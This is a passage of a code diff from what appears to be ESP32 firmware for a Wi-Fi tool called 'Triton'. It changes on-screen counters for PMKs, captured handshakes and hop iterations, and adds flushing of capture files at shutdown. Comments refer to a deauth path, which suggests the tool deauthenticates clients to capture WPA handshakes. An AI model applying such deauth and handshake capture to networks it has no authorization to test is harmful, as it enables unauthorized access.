+             * value across redraws, hop_task has crashed or hung and
+             * we know to look there. If it climbs but TX stays 0, the
+             * issue is downstream in the deauth path. */
+            d.setTextColor(T_DIM, T_BG);
+            d.setCursor(rx, BODY_Y + 96);
+            d.printf("it: %-6lu", (unsigned long)s_hop_iter);
+
             d.setTextColor(s_pmk > 0 ? T_GOOD : T_DIM, T_BG);
-            d.setCursor(rx, BODY_Y + 48); d.printf("PMK: %lu", (unsigned long)s_pmk);
+            d.setCursor(rx, BODY_Y + 48); d.printf("PMK: %-9lu", (unsigned long)s_pmk);
 
             /* HS — the hero stat. Flash row on capture. */
             static uint32_t hs_flash_until = 0;
@@ -1090,7 +1350,7 @@ void feat_triton(void)
             if (hs_flash) d.fillRect(rx - 2, BODY_Y + 56, 126, 12, T_ACCENT);
             d.setTextColor(hs_flash ? T_BG : (s_hs > 0 ? T_ACCENT : T_FG),
                            hs_flash ? T_ACCENT : T_BG);
-            d.setCursor(rx, BODY_Y + 58); d.printf("HS:  %lu", (unsigned long)s_hs);
+            d.setCursor(rx, BODY_Y + 58); d.printf("HS:  %-9lu", (unsigned long)s_hs);
 
             /* Channel quality sparkline — 13 bars for the RL brain. */
             int spark_y = BODY_Y + 74;
@@ -1184,15 +1444,14 @@ void feat_triton(void)
     }
 
     s_alive = false;
+    capture_flush();
+    wdr_flush();
+    triton_learn_save();
     delay(100);
     esp_wifi_set_promiscuous(false);
-    /* hop_task closes softAP at the end of each iteration — nothing
-     * to tear down here. */
     if (s_file)     { s_file.flush();     s_file.close(); }
     if (s_wdr_file) { s_wdr_file.flush(); s_wdr_file.close(); }
     gps_end();
-    /* Bring ESP-NOW back up so the global C5 status pill + C5 menu
-     * features work again after Triton exits. */
     c5_begin();
     delay(200);
 }
